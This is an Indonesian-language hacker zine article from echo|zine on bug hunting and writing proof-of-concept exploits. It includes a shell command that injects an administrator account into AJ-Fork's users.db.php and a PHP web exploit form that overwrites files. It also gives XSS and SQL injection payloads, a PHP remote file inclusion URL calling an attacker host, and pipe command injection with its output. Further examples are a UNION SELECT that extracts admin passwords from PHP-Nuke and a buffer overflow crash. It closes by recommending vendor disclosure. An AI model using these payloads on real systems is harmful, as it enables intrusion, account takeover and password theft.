@@ -1,0 +1,667 @@
+
+                      echo|zine, volume 4, issue 13                       
+
+------------------------[ 0second: Meet The Bugs ]------------------------
+--------------------------------------------------------------------------
+----------------------[ y3dips <y3dips@gmail.com> ]-----------------------
+
+
+"Keeping knowledge free" does not mean "Promoting random carnage"
+	-- Hack in The Box                                                                             
+
+"Knowledge is Power, Share it and it will Multiply"
+	-- Onno W. Purbo
+
+
+-- -- -(  0. Pendahuluan  )
+
+	Bosan menunggu 0day exploits? Percayalah, menunggu adalah hal yang 
+sangat membosankan. Belum lagi beredarnya advisory maupun exploit palsu di 
+mailing list security yang bertujuan mengelabui "script kiddies".
+
+	Artikel ini dibuat berdasarkan pengalaman penulis pribadi dalam 
+melakukan bug hunting dan kemudian membuat proof-of-concept code (exploit).
+
+-- -- -(  1. Menggunakan Public Advisories  )
+
+	"Public Advisories" adalah semacam peringatan atau rekomendasi 
+berhubungan dengan keamanan komputer yang telah dirilis ke publik. Public 
+Advisories dapat ditemukan pada situs-situs security seperti SecurityFocus[1], 
+Packetstorm Security[2], K-Otik[3] atau situs resmi vendor aplikasi seperti 
+OpenSSH[4], PhpBB[5], Microsoft[6]. Selain itu, beberapa mailing list
+yang membahas soal security seringkali dijadikan tempat publikasi advisory,
+seperti Bugtraq[7] dan Full-Disclosure[8].
+
+	Apa yang menjadi konten dari advisory yang dirilis tergantung si 
+penulisnya. Beberapa ada yang menyertakan proof-of-concept (PoC) code 
+(exploit), ada yang tidak menyertakan PoC namun memberikan keterangan detail
+tentang kelemahan yang ditemukan sehingga memberikan petunjuk secara tidak
+langsung bagaimana melakukan exploitasinya, dan ada yang memberitahukan
+informasi minimal terhadap bugs yang ditemukan.
+
+	Proses rilis advisory sendiri bermacam-macam, ada yang begitu langsung
+menemukan bugs kemudian membuat PoC lalu mempublikasikannya tanpa memberitahu
+vendor. Ada yang melakukan koordinasi dengan vendor untuk melakukan 
+responsible disclosure -- proses ini terkadang memakan waktu yang cukup lama.
+
+	Oleh karena sudah dirilis ke publik, maka bagi mereka yang ingin mencoba
+mendapatkan sedikit kesenangan dan keuntungan (fun and profit) dari 
+vulnerability yang terdapat pada sebuah public advisory, sudah tentu mendapat
+sedikit kesulitan. Umumnya vendor telah menyiapkan patch atau update untuk
+mengatasi vulnerability yang dimaksud, sehingga untuk kepentingan "mass 
+hacking", seseorang tentu harus berpacu terhadap waktu dengan kecepatan update
+pemilik sistem yang menjadi target.
+
+	Bagian berikut membahas bagaimana kita dapat membuat exploit 
+berdasarkan advisory yang sudah dirilis, terlepas apakah advisory tersebut 
+menyertakan exploit code sebagai PoC atau tidak.
+
+	Penulis mengambil contoh advisory yang pernah penulis publikasikan[9] 
+namun tidak disertai dengan PoC code. Waktu itu penulis mengira bahwa setiap 
+user pada server hosting _pasti_ memiliki akses shell, ternyata pada 
+kenyataannya user seringkali hanya diberikan akses pada control panel yang 
+mempunyai fitur upload, hapus, atau membuat file dan direktori.
+
+Kutipan advisory tersebut:
+ | full advisories at http://echo.or.id/adv/adv07-y3dips-2004.txt
+ | 
+ | D. Access to Database file are allowed (Write, Read, Execute)
+ | 
+ | Ajfork use file "users.db.php" as database file to archive user information
+ | ( surname, id, *password ) , and the worst thing is the install instruction
+ | 
+ | This is the readme file, showing the instruction, which is can be reach at
+ | http://[$SITE]/ajfork/readme.htm
+ | 
+ | --------------------------------readme.htm---------------------------------
+ | 
+ | Installing
+ | 
+ | Installing CuteNews AJ-Fork is really quite simple, but to make it even more
+ | simple for you, this step-by-step guide has been written:
+ | 1. ---
+ | 5. Use your FTP client to CHMOD:
+ |    777 (755 might work): all files and folders in the "data/ folder"
+ |    644 (or just 777): index.php
+ |    This will enable the script to read/write from/to its datafiles.
+ |  7. ---
+ |  
+ |  
+ | so what is the problem ?
+ | the real problem is ? the "users.db.php" are in the data/ folder , it means
+ | that other user/nobody account can write to that file. then [attacker] could
+ | inject the file with "known" database format.
+ | 
+ | POC :
+ | 
+ | dudul  : ajfork user / admin [1]
+ | y3dips : [ATTACKER] (user with the same host)
+ | 
+ | ---------------------------------users.db.php-----------------------------
+ | <?PHP die("You don't have access to open this file."); ?>
+ | 
+ | 1095859199|1|dudul|c3cf519bdad87c229a203ae5a42a23f2|dudul|dudul@dudul.com|1|0||1096478833||
+ | ----------------------------------  EOF ----------------------------------
+ | 
+ | Scenario :
+ | 
+ | ^ [y3dips@ESC data]$ pwd
+ |   /var/www/html/ajfork/data
+ | 
+ | ^ [y3dips@ESC data]$ ls -la users.db.php
+ |   -rwxrwxrwx    1 dudul    dudul         433 Sep 30 00:30 users.db.php
+ | 
+ | 
+ | ^ [y3dips@ESC data]$ echo "1096482670|1|y3dips|fb8ce4bfe2d0cafce47202961ecc64b3|y3dips|y3dips@ganteng.com|0|0||||" >> users.db.php
+ | 
+ | let see the file "users.db.php"
+ | 
+ | ---------------------------------users.db.php-----------------------------
+ | <?PHP die("You don't have access to open this file."); ?>
+ | 
+ | 1095859199|1|dudul|c3cf519bdad87c229a203ae5a42a23f2|dudul|dudul@dudul.com|1|0||1096478833||
+ | 1096482670|1|y3dips|fb8ce4bfe2d0cafce47202961ecc64b3|y3dips|y3dips@ganteng.com|0|0||||
+ | ------------------------------------- EOF --------------------------------
+ | 
+ | now, just go to the site and manage the site with y3dips account (administrator) 
+
+Dari advisory tersebut dengan jelas diketahui bahwa untuk seseorang dapat 
+memodifikasi file users.db.php. Untuk dapat melakukannya, ia harus memiliki
+akses pada sistem tersebut, dapat berupa akses shell, akses upload, atau
+modifikasi via web.
+
+Sebagai contoh, penulis menggunakan HTML & PHP code untuk melakukan modifikasi
+via web.
+
+ | <html><head>
+ | <title>AJ_fork , write database exploit</title>
+ | </head>
+ | <body bgcolor="black" >
+ | <br>
+ | <font color="white" >users.db.php (aj_fork) exploit</font><br>
+ | <form name="form" method="post" action="aj_exploit.php">
+ | <p>
+ | <font color="white" >file :</font> <input type="text" name="filenyo"><br>
+ | <font color="white" >cmd  :</font> <input type="text" name="tambah"><br>
+ | <input type="submit" name="Submit" value="Tulis">
+ | </p>
+ | </form>
+ | <p>
+ | <?php
+ | if (file_exists($filenyo))
+ | {
+ | 		$file = fopen($filenyo, "w");
+ | 		fputs($filenyo, $tambah);
+ | 		fclose($filenyo);
+ | }
+ | ?>
+ | </p>
+ | </body>
+ | </html>
+
+Argumen $filenyo merupakan file users.db.php beserta pathnya, sebagai contoh
+"/var/www/users/d/du/dudul.com/users.db.php". Sedangkan argumen $tambah
+merupakan entry yang ingin kita tambahkan, sebagai contoh
+"1096482670|1|y3dips|fb8ce4bfe2d0cafce47202961ecc64b3|y3dips|y3dips@ganteng.com|0|0||||"
+
+-- -- -(  2. Bugs Hunting  )
+
+	Seringkali kita bertanya, apakah kita terlalu bodoh untuk menemukan 
+bugs sendiri? -- Jika kita tidak pernah mencoba menghancurkan apa yang jadi
+penghalang, maka kita tidak akah pernah mengubah apapun. Jangan salahkan
+siapapun jika kita akan tetap jadi "script kiddies for *the next one
+hundred years*" -- mengutip apa kata Bon Jovi :-)
+
+	Menurut penulis, seseorang yang ingin memulai bugs hunting harus:
+
+1. Bersifat kritis dan menggunakan logika
+
+   Semuanya dimulai dengan sifat kritis dan mengkombinasikannya dengan 
+   logika. Ketika seseorang menemukan sesuatu yang dirasa janggal pada 
+   sebuah aplikasi, dan kemudian melakukan penyelidikan lebih mendalam, 
+   dapat dikatakan sebagai langkah awal proses analisis bug.
+   
+   Pemahaman tentang logika programming adalah nilai plus.
+
+2. Penguasaan bahasa pemrograman
+
+   Bahasa pemrograman tidak ubahnya seperti bahasa percakapan yang kita 
+   kenal. Untuk mengetahui apa yang salah terdapat penggunaan sebuah kata
+   dalam kalimat sudah tentu kita harus memahami bagaimana seharusnya 
+   penggunaan kata tersebut dengan baik dan benar.
+   
+   Kemampuan programming akan sangat membantu ketika kita akan membuat
+   PoC code.
+
+3. Pengetahuan tentang vulnerability umum
+
+   Semakin banyak pengetahuan yang dimiliki akan sangat menolong. Sebagai
+   contoh:
+
+     * XSS atau SQL injection vulnerabilities untuk aplikasi basis web
+
+     * Buffer overflow atau format string vulnerabilities untuk aplikasi 
+       yang dibuat dengan bahasa pemrograman C.
+
+
+	Untuk memudahkan proses investigasi, penulis membagi aplikasi target 
+menjadi dua bagian; closed source dan open source applications.
+
+	"Fasten your seat belt while we are moving in"
+
+-- -(  a. Closed Source Application  )
+
+	Pada aplikasi jenis ini, kita dapat melakukan metode "blackbox testing",
+dimana kita mempunyai informasi minim tentang aplikasi yang menjadi target.
+
+--(  i. Executable Applications  )
+
+* Denial of Service (Low Level Classes)
+
+	Pada aplikasi SSHSecureShellClient-3.2.2, penulis menemukan beberapa 
+kejanggalan dimana user yang melakukan proses transfer file atau direktori
+secara batch (banyak file atau direktori sekaligus) akan berhenti ketika 
+mentransfer sebuah file dengan size 0 byte.
+
+	Penulis belum melakukan penyelidikan lebih lanjut apakah proses transfer
+0 byte tersebut dapat mematikan SSH daemon, menaikkan CPU usage, atau hanya
+menghentikan proses transfer saja.
+
+* Remote Denial of Service Vulnerability (BOF cases)
+
+	Sebagai contoh, penulis menggunakan advisory dari No System Group[10]. 
+Berdasarkan advisory tersebut, dengan memberikan input sebanyak 96 
+karakter pada proses login messaging server Citadel/UX, dapat menyebabkan
+aplikasi tersebut down. 
+
+	coki@servidor:~$ telnet localhost 504
+	Trying 127.0.0.1...
+	Connected to localhost.
+	Escape character is '^]'.
+	200 servidor Citadel/UX server ready.
+	USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	Connection closed by foreign host.
+	coki@servidor:~$
+
+--(  ii. Web Applications  )
+
+	Ada banyak sekali threats terhadap aplikasi basis web yang bisa kita 
+manfaatkan dalam metode Blackbox. Diantaranya adalah:
+
+* Cross site Scripting (XSS)
+
+	Kita dapat menggunakan tag HTML dalam melakukan analisis, yaitu dengan cara
+menyertakannya pada input box atau pada URL.
+
+	Sebagai contoh; sebuah URL sebagai berikut,
+
+	http://victim.com/index.php?modul=satu&id=2
+
+	Tag <b>test</b> atau <script>alert(document.cookie)</script> dapat 
+digunakan sebagai "value".
+
+	http://victim.com/index.php?modul=<script>alert(document.cookie)</script>satu&id=2
+	http://victim.com/index.php?modul=satu&id=<b>test</b>2
+
+Jika tidak ditemukan hasil yang memuaskan, dapat diasumsikan bahwa script 
+telah melakukan validasi input dengan memblokir input karakter <, >, dst.
+Jangan langsung putus asa, coba encode tag HTML tersebut. Sebagai contoh
+"%3Cscript%3Ealert(document.cookie)%3C/script%3E" untuk 
+<script>alert(document.cookie)</script>.
+
+* SQL injection
+
+	Sama seperti XSS, proses checking dapat dilakukan pada input box atau 
+via URL.
+
+	Sintaks yang dapat dicoba adalah 'or 1=1-- dan contoh penggunaannya adalah 
+
+	http://victim/login.asp?user=test'or 1=1--
+
+* PHP remote file inclusion
+
+	Aplikasi web dapat menampilkan atau mengeksekusi code yang terdapat di
+remote site. Hal ini terjadi karena PHP menganggap URL sama dengan path
+sebuah file.
+
+	Sebagai contoh:
+
+	http://victim.com/index.php?action=menu&page=http://www.attacker.com/code.php
+
+* Command execution
+
+	Beberapa aplikasi CGI yang tidak melakukan validasi dengan baik dapat
+diperdaya untuk melakukan remote command execution. 
+
+	Sebagai contoh, karakter | (pipe) tidak divalidasi sehingga mengijinkan
+penyerang memberikan perintah lanjutan.
+
+	http://victim.com/index.cgi?id=|id|
+
+
+-- -(  b. Open Source Application  )
+
+	Mereka yang mengerti dan memahami bahasa pemrograman dapat dengan mudah
+menemukan bugs pada aplikasi open source dengan menganalisis source codenya.
+Walaupun demikian, bagi yang mereka yang tidak mengerti bahasa pemrograman
+yang digunakan aplikasi target, teknik blackbox testing masih tetap dapat
+dipergunakan.
+
+	Repository aplikasi open source seperti Sourceforge[11] atau 
+Freshmeat[12] dapat dijadikan tempat untuk mencari target.
+
+--(  i. Executable Applications  )
+
+* Buffer Overflow Vulnerability
+
+	B0f (buffer overflow) merupakan salah satu metode tertua untuk 
+mengambil alih program yang vulnerable. Berikut adalah salah satu bug yang 
+dijelaskan dalam advisory[13] yang dikeluarkan oleh No System Group.
+
+--- dupescan.c ---
+39: int main (int argc, char *argv[]) {
+40:   FILE *fp;
+41:   char dupename[255], dupefile[255], Temp[255];
+42:   struct dupefile buffer;
+43:   if (argc == 1){
+44:     printf("USAGE: %s <filename>\n", argv[0]);
+45:     return 0;
+46:   }
+47: 
+48:   read_conf_datapath(Temp);
+49:   sprintf(dupefile, "%s/logs/dupefile", Temp);
+50: 
+51:   strcpy(dupename, argv[1]); <----- THE BUG
+52:   if((fp = fopen(dupefile, "r")) == NULL)
+53:     return 0;
+54: 
+--- dupescan.c ---
+
+	Dari cuplikan code diatas, pada barus ke-51, aplikasi dupescan akan 
+menyalin input dari user menjadi "dupename" yang buffernya dibatasi 255 
+buah karakter.  Sehingga jika user memberikan input lebih dari 255 karakter 
+maka aplikasi akan mengalami error.
+
+y3dips@heaven:~$ /glftpd/bin/dupescan `perl -e 'print "A" x 300'`
+Done
+Segmentation fault
+y3dips@heaven:~$
+
+	Untuk metode exploitasi yang memanfaatkan vulnerability ini, penulis 
+menyarankan Anda untuk membaca tulisan Aleph One[14]
+
+
+--(  ii. Web Applications  )
+
+
+* SQL Injection
+
+	Untuk aplikasi web yang berbasis PHP dan MySQL, berikut ini merupakan 
+script yang dapat digunakan untuk membaca variable dan menghitung jumlah 
+berapa kali variable tersebut digunakan.
+
+	//http://www.waraxe.us/ftopicp-2906-.html#2906
+	//script originally writen by janek vind from waraxe.us
+	<?php
+
+	if(empty($_REQUEST['file']))
+	{
+	?>
+
+	<HTML>
+	<HEAD>
+	<TITLE>Select file to analyze...</TITLE>
+	</HEAD>
+	<BODY>
+	<CENTER><br><br><br>
+	<H3>Enter filename ...</H3>
+
+	<FORM action="test.php" method="POST">
+	<INPUT type="text" name="file" length="40">
+	<INPUT type="submit" name="do" value="Analyze now!">
+	</FORM>
+
+	</CENTER>
+	</BODY>
+	</HTML>
+	<?php
+	}
+	else
+	{
+   		if(!is_file('./'.$file.'.php'))
+   		{
+      		die('file can not be open, sorry...');
+   		}
+   	else
+   		{
+      		$lines = file('./'.$file.'.php');
+      		$buf = '';
+      
+      	foreach ($lines as $line_num => $line)
+      		{
+         	$buf .= trim($line);
+      		}
+      //-------------------------------------------------
+      	$params = array();$offset = 0;
+      	$buf = explode('$',$buf);
+      	$nr = 0;
+      
+      	for ( $i = 1; $i < count($buf); $i ++ )
+      		{
+         	$buf2 = $buf[$i];
+         	$len = strlen($buf2);
+         	$len2 = 0;
+         	for ( $j = 0; $j < $len; $j ++ )
+         	{
+            	$buf3 = substr($buf2,$j,1);
+            	if(!is_var_char($buf3))
+            	{
+               		$len2 = $j;
+               		$j += $len;
+            	}
+         	}
+         	if($len2 > 0)
+         		{
+            		$buf3 = substr($buf2,0,$len2);
+            		$old = 0;
+            		for($j=0;$j<count($params);$j++)
+            		{
+               		if($params[$j][0] == $buf3)
+               			{
+                  		$params[$j][1] ++;
+                  		$old = 1;
+                  		$j += count($params);
+               			}
+            		}
+            		if($old == 0)
+            		{
+               			$params[$nr][0] = $buf3;
+               			$params[$nr][1] = 1;
+               			$nr ++;
+            		}
+         	}
+      		}
+      
+      	sort($params);
+      
+      	for($i=0;$i<count($params);$i++)
+      	{
+         echo '<br> $'.$params[$i][0].' --> '.$params[$i][1];
+      	}
+   	}
+	}
+
+	//----------------------------------------------------------
+	function is_var_char( $buf )
+	{	
+   	$nr = ord( $buf );
+   
+   	if( ($nr > 64 && $nr < 91 ) || 
+   		($nr > 96 && $nr < 123) || 
+   		($nr > 47 && $nr < 58) || 
+   		($nr == 95) )
+   	{
+      		return true;
+   	}
+   
+   	return false;
+	}
+
+	?>
+
+
+	Script tersebut juga dapat memeriksa variable yang tidak dideklarasikan
+sebelumnya (dapat dimungkinkan jika terjadi kesalahan dalam penulisan).
+
+	Sebagai contoh pada aplikasi nuke76 (lihat advisory[15] yang dirilis 
+oleh Janek Vind untuk vulnerability ini). Terjadi kesalahan penulisan 
+variable "queryplang" menjadi "querylang". Hasil dari script diatas adalah
+
+...
+$querylang --> 1
+$queryplang --> 15
+...
+
+	Variable queryplang telah difilter, namun querylang (yang belum 
+dideklarasi sebelumnya.. dan _belum_ difilter) memungkinkan kita untuk 
+mengeksekusi perintah pada MySQL.
+
+Dan untuk mengeksploitasinya,
+http://localhost/nuke76/modules.php?name=Top&querylang=%20WHERE%201=2%20UNION%20ALL%20SELECT%201,pwd,1,1%20FROM%20nuke_authors/*
+
+Cara penyelesaiannya[16] sudah tentu sangat mudah, yaitu dengan mengganti 
+variable "$querylang" menjadi "$queryplang". 
+
+* Remote execution for CGI
+
+Mari kita perhatikan source module.cgi berikut.
+
+-------- module.cgi -------
+...
+open(FILE, $file);
+while (<FILE>)
+{
+   print $_;
+}
+...
+-------- module.cgi -------
+
+	Pada script tersebut, terdapat variable yang tidak diparsing yaitu 
+$file. Sehingga kita dapat memanfaatkannya sebagai berikut.
+
+	http://victim.com/module.cgi?id=3&file=|id|
+
+dan kita mendapatkan output berikut.
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+-- -- -(  3. Studi Kasus  )
+
+	Berikut ini, penulis memberikan contoh melakukan analisis terhadap 
+sebuah aplikasi bulletin board opensource yang menggunakan PHP dan MySQL. 
+Aplikasi tersebut adapah PunBB[17].
+
+1.	Installasi
+
+	Lakukan proses instalasi berdasarkan manual.
+
+2.	Analisis awal
+
+	* file Config.php memuat user dan password untuk konek ke dapabase.
+	* Instruksi untuk memberikan permisssion 0777 pada direktori cache
+	  dan avatar.
+	
+	Aplikasi ini dapat menjadi sangat rentan jika diinstal pada multiuser
+	system (seperti shared hosting) -- lihat contoh kasus vulnerability
+	pada AJ-Fork diatas.
+
+3.  Proteksi file dan direktori 
+
+	Direktori include dapat di browse, sehingga files didalamnya dapat 
+	terlihat; -- information disclosure
+
+	http://localhost/punBB/include/
+ 
+4.  Analisis PHP script
+
+	Oleh karena waktu riset yang mendesak demi mengejar deadline penulisan
+	artikel ini, penulis hanya fokus memeriksa file search.php. Mengapa
+	file search.php? Jawaban sederhana adalah file tersebut sudah dapat
+	dipastikan membutuhkan input dari user. :-)
+
+	Apa yang menarik dari file tersebut?
+
+	---- search.php ---- line 76
+	
+	(($_GET['search_in'] == 'message') ? 1 : -1);
+		}
+		// If it's a user search (by id)
+		else if ($action == 'show_user')
+		{
+			$user_id = intval($_GET['user_id']);
+			if ($user_id < 2)
+				message($lang_common['Bad request']);
+		}
+		else
+		{
+			if ($action != 'show_new' && $action != 'show_24h' 
+				&& $action != 'show_unanswered' 
+				&& $action != 'show_subscriptions')
+				message($lang_common['Bad request']);
+		}
+
+	----- search.php -----
+
+	Sebagai informasi, user admin memiliki value variable user_id = 1, user
+	guest memiliki value variable user_id = 3, sedangkan user lainnya
+	memiliki value variable user_id = 4.
+	
+	Dari potongan script diatas, dapat dilihat bahwa action show_user tidak
+	dengan jelas memberitahukan bahwa user_id dibutuhkan. Sehingga jika
+	kita tidak menyertakan variable user_id pada proses pencarian, kita
+	akan mendapatkan pesar error.
+
+		http://localhost/punBB/search.php?action=show_user
+
+	Pesan error yang ditampilkan: 
+
+	Notice: Undefined index: user_id in /var/www/punBB/search.php on line 81
+
+	Ya, yang kita dapatkan adalah full path disclosure. Aplikasi punBB
+	diinstal pada direktori /var/www/punBB. 
+
+
+-- -- -(  4. Penutup  )
+
+	Setelah menemukan bugs atau membuat exploit sendiri, ada baiknya 
+kemudian mempertimbangkan apakah informasi tersebut akan dipublikasikan atau 
+disimpan dan digunakan untuk kepentingan sendiri.
+
+	Jika ingin dipublikasikan, maka penulis menyarankan agar menghubungi
+pihak vendor terlebih dahulu agar mereka dapat mengantisipasi threat dengan
+merilis patch atau update.
+
+	Walaupun artikel ini hanya membahas bagaimana proses bug hunting dan
+membuat PoC code secara umum, penulis harapkan dapat berguna bagi pembaca.
+
+
+Greetz:
+ - m0by, the_day, comex, z3r0byt3, k-159, c-a-s-e, s`to, lirva32, anonymous
+ - Jim Geovedi, Dani Firmansyah 
+ - newbie_hacker@yahoogroups.com
+ - #e-c-h-o @ Dalnet
+
+-- -- -(  5. Referensi  )
+
+
+1.	SecurityFocus, 
+	http://securityfocus.com
+
+2.	Packetstorm Security, 
+	http://packetstormsecurity.org
+
+3.	K-Otik, 
+	http://k-otik.com.
+
+4.	OpenSSH, 
+	http://openssh.org
+
+5.	PhpBB, 
+	http://phpbb.com
+
+6.	Microsoft, 
+	http://microsoft.com
+
+7.	Mailing list Bugtraq, 
+	bugtraq@securityfocus.com 
+
+8.	Mailing list Full-Disclosure, 
+	full-disclosure@securityfocus.com     
+
+9,	y3dips, "Multiple Vulnerabilities in AJ-Fork", 
+	http://echo.or.id/adv/adv07-y3dips-2004.txt
+
+10. No System Group - Advisory #04 - 28/07/04
+	http://www.nosystem.com.ar/advisories/advisory-04.txt
+
+11. Sourceforge,
+	http://www.sourceforge.org/
+
+12. Freshmeat
+	http://www.freshmeat.net/
+
+13. No System Group - Advisory #05 - 18/09/04
+	http://www.nosystem.com.ar/advisories/advisory-05.txt
+
+14. Aleph One, "Smashing The Stack For Fun And Profit", 
+	Phrack #49, 1996.
+
+15. Janek Vind, "XXXXXXX"
+	http://www.waraxe.us/advisory-41.html
+
+16. Waraxe IT Security Portal, SA#41 - How to fix
+	http://www.waraxe.us/ftopicp-2906-.html#2906	
+
+17. PunBB
+	http://www.punbb.org/
